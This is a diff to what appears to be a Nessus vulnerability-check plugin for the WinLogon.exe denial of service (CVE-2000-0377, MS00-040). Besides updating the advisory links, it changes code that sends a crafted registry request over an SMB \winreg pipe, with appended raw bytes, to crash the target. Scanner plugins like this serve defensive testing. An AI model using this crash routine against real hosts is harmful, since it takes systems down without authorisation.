@@ -7,8 +7,8 @@
 if(description)
 {
  script_id(10414);
- script_version ("$Revision: 1.17 $");
  script_bugtraq_id(1331);
+ script_version ("$Revision: 1.22 $");
  script_cve_id("CVE-2000-0377");
  name["english"] = "WinLogon.exe DoS";
  name["francais"] = "Déni de service WinLogon.exe";
@@ -32,7 +32,7 @@ Solution : apply hotfix Q264684
 
 Risk factor : High
 
-See also : http://www.microsoft.com/technet/security/bulletin/ms00-040.asp";
+See also : http://www.microsoft.com/technet/security/bulletin/ms00-040.mspx";
 
 
  desc["francais"] = "
@@ -49,7 +49,7 @@ Solution : appliquez le hotfix Q264684
 
 Facteur de risque : Elevé
 
-Voir aussi : http://www.microsoft.com/technet/security/bulletin/ms00-040.asp";
+Voir aussi : http://www.microsoft.com/technet/security/bulletin/ms00-040.mspx";
 
 
  script_description(english:desc["english"],
@@ -101,7 +101,7 @@ function crash_winlogon(soc, uid, tid, pipe, key, reply)
  uid_high = uid / 256;
  pipe_low = pipe % 256;
  pipe_high = pipe / 256;
- uc = unicode(data:key);
+ uc = unicode(data:key) + raw_string(0x19, 0x00, 0x02, 0x00);
  
  len = 148 + strlen(uc);
  
@@ -230,7 +230,7 @@ tid = tconx_extract_tid(reply:r);
 #
 # Create a pipe to \winreg
 #
-r = smbntcreatex(soc:soc, uid:uid, tid:tid);
+r = smbntcreatex(soc:soc, uid:uid, tid:tid, name:"\winreg");
 if(!r)return(FALSE);
 # and extract its ID
 pipe = smbntcreatex_extract_pipe(reply:r);
@@ -240,7 +240,7 @@ pipe = smbntcreatex_extract_pipe(reply:r);
 #
 r = pipe_accessible_registry(soc:soc, uid:uid, tid:tid, pipe:pipe);
 if(!r)return(FALSE);
-r = registry_access_step_1(soc:soc, uid:uid, tid:tid, pipe:pipe);
+r = registry_open_hklm(soc:soc, uid:uid, tid:tid, pipe:pipe);
 if(!r)return(FALSE);
 r2 = crash_winlogon(soc:soc, uid:uid, tid:tid, pipe:pipe, key:key, reply:r);
 return(r2);
